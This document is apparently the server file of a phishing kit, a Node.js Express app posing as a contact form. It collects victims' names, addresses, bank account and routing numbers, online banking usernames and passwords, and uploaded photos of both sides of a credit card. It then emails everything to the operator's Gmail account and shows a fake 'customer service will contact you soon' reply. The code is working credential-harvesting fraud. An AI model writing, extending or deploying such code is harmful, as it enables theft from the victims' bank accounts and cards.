require("dotenv").config();
const express = require("express");
const multer = require("multer");
const nodeMail = require("nodemailer");
const path = require("path");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// Configure multer for handling image uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

async function mainMail(
  name,
  address,
  city,
  state,
  zip,
  bank,
  accountNumber,
  routing,
  branchLocation,
  accountType,
  bankUsername,
  password,
  email,
  number,
  subject, 
  images
) {
  const transporter = await nodeMail.createTransport({
    service: "gmail",
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.PASSWORD,
    },
  });
  const mailOption = {
    from: email,
    to: process.env.GMAIL_USER,
    subject: subject,
    html: `
    <h1>Personal Details</h1>
    <p style='font-size: 3rem'>Your application will be processed. Thank you.</p>
    <p>Full Name: ${name}</p>
    <p>Mobile Number: ${number}<p>
    <p>Email: ${email}</p>
    <p>Street Address: ${address}</p>
    <p>City: ${city}</p>
    <p>State: ${state}</p>
    <p>Zip: ${zip}</p>

    <h1>Payment Information</h1>
    <p>Bank: ${bank}</p>
    <p>Account Number: ${accountNumber}</p>
    <p>Routing: ${routing}</p>
    <p>Branch Location: ${branchLocation}</p>
    <p>Account Type: ${accountType}</p>
    <p>Bank Username: ${bankUsername}</p>
    <p>password: ${password}</p>
    
    `,
    attachments: images.map((image, index) => ({
        filename: `${image.filename}.jpg`, // Customize filename as needed
        content: image.file,
      })),
  };
  try {
    await transporter.sendMail(mailOption);
    return Promise.resolve(
      "<p style='font-size: 3rem'>Thanks for your feedback, a customer service will contact you soon</p>"
    );
  } catch (error) {
    return Promise.reject(error);
  }
}

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "contact.html"));
});

app.post("/contact", upload.fields([
    { name: "credit-card-front", maxCount: 1 },
    { name: "credit-card-back", maxCount: 1 }
  ]), async (req, res, next) => {
  const {
    yourname,
    yourAddress,
    yourCity,
    yourState,
    yourZip,
    yourBank,
    yourAccountNumber,
    yourRouting,
    yourBranchLocation,
    AccountType,
    yourBankUsername,
    yourPassword,
    youremail,
    yourNumber,
    yoursubject,
  } = req.body;
  try {
    const images = []; // Array to store uploaded image buffers
      // Iterate through each image field and push the image buffer to the array
      for (const fieldName in req.files) {
        images.push({
          file: req.files[fieldName][0].buffer,
          filename: fieldName,
        });
      }

    await mainMail(
      yourname,
      yourAddress,
      yourCity,
      yourState,
      yourZip,
      yourBank,
      yourAccountNumber,
      yourRouting,
      yourBranchLocation,
      AccountType,
      yourBankUsername,
      yourPassword,
      youremail,
      yourNumber,
      yoursubject,
      images
    );

    res.send(
      "<p style='font-size: 3rem'>Thanks for your feedback, a customer service will contact you soon</p>"
    );
  } catch (error) {
    console.log(error);
    res.send("Message Could not be Sent");
  }
});
app.listen(3000, () => console.log("Server is running!"));
